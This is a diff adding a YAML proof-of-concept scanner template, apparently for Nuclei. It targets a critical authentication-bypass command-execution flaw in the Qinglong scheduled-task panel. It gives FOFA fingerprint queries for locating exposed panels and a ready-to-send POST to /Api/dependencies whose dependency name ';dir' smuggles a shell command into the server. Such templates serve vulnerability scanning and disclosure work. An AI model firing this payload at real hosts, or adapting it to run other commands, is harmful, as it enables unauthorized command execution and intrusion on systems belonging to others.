@@ -1,0 +1,19 @@
+id: poc-gcov4ng0cawx2dzh
+info:
+  name: 青龙面板dependencies存在鉴权绕过导致命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gcov4ng0cawx2dzh'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gcov4ng0cawx2dzh
+    fofa: app="青龙-定时任务管理面板" || icon_hash=="-254502902" || body="cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js" || body="umi.af6461f2.js"
+http:
+- raw:
+  - "POST /Api/dependencies HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36\nContent-Length: 34\n\n[\n  {\n    \"name\": \";dir\",\n    \"type\": 0\n  }\n]"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
